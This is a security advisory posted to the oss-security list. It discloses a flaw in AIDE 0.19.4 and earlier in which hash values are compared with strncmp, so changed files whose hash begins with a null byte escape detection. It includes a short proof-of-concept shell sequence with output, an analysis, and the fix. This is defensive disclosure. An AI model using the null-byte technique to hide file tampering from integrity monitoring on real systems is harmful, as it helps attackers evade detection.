X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/10/22/5
Message-ID: <20261022140255.GA2@magnesium.vonhaugwitz.com>
Date: Thu, 22 Oct 2026 16:02:55 +0200
From: Hannes von Haugwitz <hannes@...haugwitz.com>
To: oss-security@...ts.openwall.com
Subject: aide (<= 0.19.4) improper comparison of hash values containing a null byte (AIDE detection bypass) [GHSA-6wc9-4w69-5jc5, CVE pending]
Content-Type: text/plain; charset=utf-8

Summary
=======

It was discovered that AIDE, a host-based file and directory integrity checker,
improperly compares hash values containing a null byte. An attacker could craft
a malicious file with a hash value matching the existing hash in every byte up
to and including the first 0x00 byte so that the hash change is silently
ignored by AIDE. A local user could exploit this to bypass the AIDE detection
of malicious files.

Project
=======

AIDE (Advanced Intrusion Detection Environment)

Affected versions
=================

AIDE <= 0.19.4

CVE ID
======

A CVE ID has been requested, but is not yet available; please cross-reference
this vulnerability as GHSA-6wc9-4w69-5jc5 for now. The advisory will be
updated, as soon as a CVE ID is available.

Proof of concept
================

    $ mkdir test
    $ echo -n "00031388$(for i in {1..248} ; do printf '%c' x ; done)" > test/file
    $ aide --config <(printf -- "root_prefix=./test\n\ndatabase_out=stdout\n/file sha256+sha512\n") --init > test/aide.db
    $ echo -n "!0031388$(for i in {1..248} ; do printf '%c' x ; done)" > test/file
    $ aide --config <(printf -- "root_prefix=./test\n\ndatabase_in=file:test/aide.db\n/file sha256+sha512\n") --check
    Start timestamp: 2026-10-17 19:28:38 +0200 (AIDE 0.19.4)
    AIDE found differences between database and filesystem!!
    Root prefix: ./test

    Summary:
      Total number of entries:	1
      Added entries:		0
      Removed entries:		0
      Changed entries:		1

    ---------------------------------------------------
    Changed entries:
    ---------------------------------------------------

    f           H      : /file

    ---------------------------------------------------
    Detailed information about changes:
    ---------------------------------------------------

    File: /file
     SHA512    : P8b+dtBxYkuzpArlOTav0mcbnsgyK6yN | M4dh5Bf8Qq8SXttTI05UFhooBkU6TzBg
                 GXLU29ddIz0KH8JwXFQBg1kr29WRxCf1 | IdvZInsXpytohLbiVQws60Qa+rNOn1yz
                 CEh60upsX4R1fFjjVjZ4xA==         | yVPaQ2MEcqsMQ/CZNKy7kg==


    ---------------------------------------------------
    The attributes of the (uncompressed) database(s):
    ---------------------------------------------------

    test/aide.db
     SHA256    : 7pkJPevLDacvy1SlNpDdbO2LJC9K+eVp
                 JbiJwoPJz1c=
     SHA512    : cE7/5LIJ45y0JrY51BqX033/PaY50qHU
                 1UMUz7zQzILXJObOsG0C2SV2PVCQJWFx
                 ocCjWdAy8ZOaDBX/aN9Xhw==
     STRIBOG256: cnuQwLejgI+VBBVvl3EcHPcU+eW855Gx
                 BJNvvVIqOk4=
     STRIBOG512: CZa/yVLVDQQkCR+Z5Q+zO4u3nvGSRci+
                 IOvlfUkMZuDcBu9cTfGmiPZLbnzgpRsk
                 2Yz1t3TnRE1DhDH4Wzf/qg==
     SHA512/256: rk6L06UvIay94ky7CEtMdmCUTEVaBMtk
                 zK/Ojy0AoEA=
     SHA3-256  : lU0ArehEa2V4Ovhujiz/GjsZLyNpjwhM
                 LoLS+1HYlhY=
     SHA3-512  : nOFvtQgHYrlT+XMCc3BqflAd6iCdbbC5
                 1Zr4VerGXc+aOnD2E5Nrl6Z4U2Yed8RI
                 3PUOngDqiUafGusEM+yVcQ==


    End timestamp: 2026-10-17 19:28:38 +0200 (run time: 0m 0s)


The report correctly shows the change of the `sha512` hash, but misses the
change of the `sha256` hash.

Analysis
========

The vulnerability is caused by using `strncmp` instead of `memcmp` for
comparing hash values in `bytecmp` function, resulting in `bytecmp` not
comparing the entire hash value if one of the hash values contain a null byte.

In the proof of concept example above the hash values of the old and the new
content starts with a null byte, so only the first byte (the 0x00 byte) is
compared and the `sha256` hash value change is missed.

Mitigation
==========

Upgrade to AIDE v0.19.5

Alternatively apply the provided patch:

aide-0.19_GHSA-6wc9-4w69-5jc5_bytecmp.patch

If you cannot upgrade, consider adding multiple hash functions to your rules (the `H`
attribute group adds all available hash functions) to increase the probability a
content change is reported even if one hash contains a null byte.

Credit
======

The issue was reported by a community member.

References
==========
[AIDE](https://aide.github.io)
[v0.19.5](https://github.com/aide/aide/releases/tag/v0.19.5)
[GHSA-6wc9-4w69-5jc5](https://github.com/aide/aide/security/advisories/GHSA-6wc9-4w69-5jc5)

View attachment "aide-0.19_GHSA-6wc9-4w69-5jc5_bytecmp.patch" of type "text/x-diff" (459 bytes)

Download attachment "signature.asc" of type "application/pgp-signature" (660 bytes)
